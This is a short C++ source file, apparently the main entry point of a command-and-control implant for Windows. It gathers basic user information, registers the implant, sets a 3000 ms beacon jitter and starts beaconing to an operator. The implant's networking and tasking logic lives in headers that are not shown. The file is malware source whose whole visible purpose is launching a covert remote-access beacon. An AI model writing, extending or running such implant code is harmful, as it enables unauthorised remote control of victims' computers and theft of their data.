#include <windows.h>
#include <stdio.h>
#include <iostream>

#include "core.h"
#include "Implant.h"
#pragma comment(lib, "ntdll.lib") // Link to ntdll.lib

int main() {
	BasicUserInformation basicUserInfo; // 
	Implant implant = Implant(basicUserInfo);

	implant.RegisterImplant();
	implant.setJitter(3000);
	implant.StartBeacon();

	return 0;
}